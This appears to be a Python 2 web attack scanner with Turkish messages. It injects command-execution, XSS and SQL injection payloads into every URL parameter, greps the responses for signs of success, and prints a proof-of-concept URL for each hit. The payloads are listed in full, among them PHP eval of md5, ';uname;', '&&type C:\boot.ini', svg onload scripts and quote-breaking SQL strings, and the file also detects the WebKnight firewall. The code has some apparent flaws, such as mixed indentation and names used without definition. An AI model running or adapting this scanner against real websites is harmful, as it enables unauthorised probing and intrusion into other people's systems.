#!/usr/bin/env python
import urllib
import re
from headers import *

def main_function(url, payloads, check):

        opener = urllib.urlopen(url)
	vuln = 0
        if opener.code == 999:

                print ga.red +" [~] WebKnight WAF Algilandi!"+ga.end
                print ga.red +" [~] Her Istek Arasinda 3 Saniye Gecikme"+ga.end
                time.sleep(3)
        for params in url.split("?")[1].split("&"):

            for payload in payloads:

                bugs = url.replace(params, params + str(payload).strip())


                request = useragent.open(bugs)
		html = request.readlines()
                for line in html:
                    checker = re.findall(check, line)
                    if len(checker) !=0:
                        print ga.red+" [*] Payload Bulundu . . ."+ga.end
                        print ga.red+" [*] Payload: " ,payload +ga.end
                        print ga.green+" [!] Code: " +ga.end + line.strip()
                        print ga.blue+" [*] POC: "+ga.end + bugs
                        print ga.green+" [*] Iyi Hackler :D"+ga.end
                        vuln +=1
        if vuln == 0:                
        	print ga.green+" [!] Hedef Zafiyetli Degil!"+ga.end
        else:
        	print ga.blue+" [!] Zafiyet bulundu %i " % (vuln) +ga.end


def rce_func(url):
	headers_reader(url)
  	print ga.bold+" [!] Remote Code/Command Execution Taramasi "+ga.end
  	print ga.blue+" [!] Linux ve Windows Isletim Sistemlerini Kapsar "+ga.end
  	print ga.blue+" [!] Lutfen Bekleyin ...."+ga.end

  	payloads = [';${@print(md5(CL))}', ';${@print(md5("CL"))}']

  	payloads += ['%253B%2524%257B%2540print%2528md5%2528%2522CL%2522%2529%2529%257D%253B']

  	payloads += [';uname;', '&&dir', '&&type C:\\boot.ini', ';phpinfo();', ';phpinfo']

  	check = re.compile("51107ed95250b4099a0f481221d56497|Linux|eval\(\)|SERVER_ADDR|Volume.+Serial|\[boot", re.I)
  	main_function(url, payloads, check)

def xss_func(url):
        print ga.bold+"\n [!] XSS Taramasi "+ga.end
        print ga.blue+" [!] Lutfen Bekleyin ...."+ga.end

        payloads = ['%27%3ECL%3Csvg%2Fonload%3Dconfirm%28%2FCL%2F%29%3Eweb', '%78%22%78%3e%78']
        payloads += ['%22%3ECL%3Csvg%2Fonload%3Dconfirm%28%2FCL%2F%29%3Eweb', 'CL%3Csvg%2Fonload%3Dconfirm%28%2FCL%2F%29%3Eweb']
        check = re.compile('CL<svg|x>x', re.I)
        main_function(url, payloads, check)

def error_based_sqli_func(url):
	print ga.bold+"\n [!] SQL Injection Taramasi "+ga.end
	print ga.blue+" [!] MySQL, Oracle, MSSQL, MSACCESS & PostGreSQL Databases "+ga.end
	print ga.blue+" [!] Lutfen Bekleyin ...."+ga.end


	payloads = ["3'", "3%5c", "3%27%22%28%29", "3'><", "3%22%5C%27%5C%22%29%3B%7C%5D%2A%7B%250d%250a%3C%2500%3E%25bf%2527%27"]
	check = re.compile("Incorrect syntax|Syntax error|Unclosed.+mark|unterminated.+qoute|SQL.+Server|Microsoft.+Database|Fatal.+error", re.I)
	main_function(url, payloads, check)
